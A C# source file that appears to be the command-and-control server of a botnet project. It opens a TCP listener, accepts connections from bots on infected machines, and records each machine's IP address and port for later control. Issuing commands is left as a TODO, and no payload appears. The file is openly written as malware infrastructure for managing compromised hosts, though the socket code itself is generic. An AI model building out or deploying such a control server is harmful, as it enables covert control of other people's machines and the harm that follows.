using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Server.CnC_Server
{
    public class Server
    {
        private readonly int ServerPort;
        private Socket ServerSocket;

        private List<Infected_Machine> Bots;

        public Server(int serverPort)
        {
            this.ServerPort = serverPort;
            this.ServerSocket = null;

            this.Bots = new List<Infected_Machine>();
        }

        public void Start()
        {
            try
            {
                Task task = Task.Factory.StartNew(() =>
                {
                    Listen();
                    while (true)
                    {
                        AcceptBot();
                    }
                });

                // TODO: Display all available commands and handle input
            }
            catch(Exception)
            {
                throw;
            }
        }

        private void Listen()
        {
            try
            {
                // Establish the local endpoint for the socket.
                // Dns.GetHostName returns the name of the host running the application.
                IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                IPAddress ipAddr = ipHost.AddressList[0];
                IPEndPoint localEndPoint = new IPEndPoint(ipAddr, ServerPort);

                // Creation TCP/IP Socket using socket Class Costructor
                this.ServerSocket = new Socket(ipAddr.AddressFamily,
                             SocketType.Stream, ProtocolType.Tcp);

                // Using Bind() method we associate a network address to the server socket
                // All client that will connect to this server socket must know this network address
                this.ServerSocket.Bind(localEndPoint);

                // Using Listen() method we create the client list that will want to connect to server
                this.ServerSocket.Listen(10);
            }
            catch(Exception)
            {
                throw;
            }
        }

        private void AcceptBot()
        {
            try
            {
                Socket clientSocket = this.ServerSocket.Accept();
                
                // Data buffer 
                byte[] bytes = new byte[1024];

                // Receive client port
                int numByte = clientSocket.Receive(bytes);
                string clientPort = Encoding.ASCII.GetString(bytes, 0, numByte);

                // Create new infected machine object with the bot ip and port
                Infected_Machine newBot = new Infected_Machine((clientSocket.RemoteEndPoint as IPEndPoint).Address.ToString(), int.Parse(clientPort));
                
                // Add the new bot to the list of bots
                Bots.Add(newBot);

                clientSocket.Close();
            }
            catch(Exception)
            {
                throw;
            }
        }
    }
}
